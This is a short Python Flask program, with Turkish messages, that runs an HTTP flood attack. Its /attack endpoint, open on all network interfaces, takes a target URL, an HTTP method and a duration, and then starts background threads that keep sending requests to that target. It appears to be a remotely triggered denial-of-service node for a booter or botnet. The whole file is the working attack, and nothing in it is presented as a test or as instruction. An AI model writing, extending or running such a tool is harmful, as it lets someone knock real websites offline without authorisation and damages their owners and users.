from flask import Flask, request, jsonify
import requests
import threading
import time

app = Flask(__name__)

def attack_target(url, method, duration, threads=10):
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time:
            try:
                if method == 'GET':
                    requests.get(url, timeout=2)
                elif method == 'POST':
                    requests.post(url, timeout=2)
                elif method == 'HEAD':
                    requests.head(url, timeout=2)
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

@app.route('/attack', methods=['POST'])
def start_attack():
    data = request.json
    url = data.get('url')
    method = data.get('method', 'GET')
    duration = data.get('duration', 10)
    
    if not url:
        return jsonify({'success': False, 'error': 'URL gerekli'}), 400

    # Saldırıyı arka planda başlat
    threading.Thread(target=attack_target, args=(url, method, duration)).start()
    
    return jsonify({'success': True, 'message': f'Saldırı başlatıldı: {url} ({method}) {duration} saniye'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
